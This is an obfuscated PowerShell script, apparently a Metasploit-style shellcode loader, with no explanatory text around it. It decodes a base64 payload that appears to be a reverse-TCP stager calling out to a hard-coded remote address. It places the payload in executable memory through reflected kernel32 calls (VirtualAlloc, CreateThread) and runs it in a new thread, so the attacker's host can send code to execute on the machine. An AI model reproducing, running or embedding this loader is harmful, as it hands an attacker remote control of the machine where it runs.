function zJqWw {
	Param ($u3yH, $hq)		
	$ym0 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $ym0.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($ym0.GetMethod('GetModuleHandle')).Invoke($null, @($u3yH)))), $hq))
}

function qvX8 {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $j1,
		[Parameter(Position = 1)] [Type] $ojz = [Void]
	)
	
	$tiAgH = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$tiAgH.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $j1).SetImplementationFlags('Runtime, Managed')
	$tiAgH.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ojz, $j1).SetImplementationFlags('Runtime, Managed')
	
	return $tiAgH.CreateType()
}

[Byte[]]$rV = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAQER8Gf9EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0DEn/znXlaPC1olb/1UiD7BBIieJNMclqBEFYSIn5QboC2chf/9VIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//VSAHDSCnGSIX2deFB/+c=")
		
$xUs = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((zJqWw kernel32.dll VirtualAlloc), (qvX8 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $rV.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($rV, 0, $xUs, $rV.length)

$ou_D = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((zJqWw kernel32.dll CreateThread), (qvX8 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$xUs,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((zJqWw kernel32.dll WaitForSingleObject), (qvX8 @([IntPtr], [Int32]))).Invoke($ou_D,0xffffffff) | Out-Null